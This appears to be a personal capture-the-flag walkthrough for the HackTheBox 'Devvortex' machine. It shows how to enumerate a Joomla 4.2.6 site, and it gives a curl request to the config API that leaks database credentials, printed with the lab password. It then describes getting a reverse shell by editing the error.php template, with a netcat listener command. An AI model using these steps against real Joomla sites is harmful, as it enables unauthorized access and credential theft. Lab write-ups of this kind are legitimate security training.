
![[Pasted image 20231127021942.png]]

# Robots.txt
![[Pasted image 20231127030959.png]]

## /administrator


we get an admin page

# joomscan
```bash
joomscan  -u http://dev.devvortex.htb/
```
running joomscan we find the version to be 4.2.6

also by navigating to http://dev.devvortex.htb//administrator/manifests/files/joomla.xml
also leaks the version
![[Pasted image 20231127070944.png]]
# Information Disclousure

we find this blog https://vulncheck.com/blog/joomla-for-rce talking about the mysql creds leak in api directory

```bash
curl -v http://URL/api/index.php/v1/config/application?public=true
```

o/p
```bash
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&pag
e%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"applica
tion","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon
.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
```

and we find password for `lewis`

# Joomla Admin
logging in with user,pass we find the access to admin page
now lets get a revshell

## mysql config
- we come to know theres mysql running on locahost with lewis, itll help later
- by navigating to system -> global configuration -> server
![[Pasted image 20231127071137.png]]
## revshell steps

![[Pasted image 20231127070753.png]]
- go to system -> site templates
- index.php wasnt writable it gave us permission error that its only readable 
- we find the template name is `cassiopeia` and after pasting our payload in error.php 
![[Pasted image 20231127070835.png]]
- paste your reverse shell payload
- visit `http://dev.devvortex.htb/templates/cassiopeia/error.php` after starting a listener `nc -lvnp 9001`
- we get a shell as `www-data`

[[00- Easy/Devvortext/initial foothold|initial foothold]]